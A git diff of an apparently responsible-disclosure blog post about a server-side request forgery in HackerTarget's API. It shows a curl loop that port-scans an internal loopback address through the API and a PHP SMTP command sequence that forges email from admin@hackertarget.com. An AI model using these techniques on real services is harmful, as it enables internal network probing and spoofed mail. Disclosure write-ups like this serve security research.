@@ -65,7 +65,7 @@ do
 	curl 'https://api.hackertarget.com/httpheaders/?q=http://'$1':'$port && echo -e "\n"
 done
 ```
-I ran it: `âžœ root@pwn  ~  ./ht 0177.1`
+I ran it: `root@pwn  ~  ./ht 0177.1`
 
 HackerTarget limits 25 API queries per IP, so my script only showed the ports 1 - 25. The only responses I got were from SSH running on port 22 and I luckily got a response from the SMTP server on port 25, which I had totally overlooked before!<br><br>
 ![HT-POSTFIX](/images/ht-postfix.png "HackerTarget")
@@ -95,9 +95,9 @@ I created another PHP file on my server that would redirect the API to the inter
         $commands = array(
                 'HELO hackertarget.com',
                 'MAIL FROM: <admin@hackertarget.com>',
-                'RCPT To: <C0RB3N@oou.us>',
+                'RCPT To: <my@email.com>',
                 'DATA',
-                'Subject: @C0RB3N!',
+                'Subject: cdl!',
                 'Corben was here, woot woot!',
                 '.'
         );
@@ -112,7 +112,7 @@ I changed the query one last time: `https://api.hackertarget.com/httpheaders/?q=
 <br><br>
 I went to my email, reloaded it once.
 <br><br>
-A new email popped up from "<font id="highlighter">admin@hackertarget.com</font>" with the subject "<font id="highlighter">@C0RB3N</font>" and the message was "<font id="highlighter2">Corben was here, woot woot!</font>"
+A new email popped up from "<font id="highlighter">admin@hackertarget.com</font>" with the subject "<font id="highlighter">cdl!</font>" and the message was "<font id="highlighter2">Corben was here, woot woot!</font>"
 <br><br>
 After yelling 'heck yeah!', I created a quick proof-of-concept video and I sent it over to HackerTarget.
 <br> <br>Here's the video <font color="#2EB03D">&#128373;&#65039;</font><br>
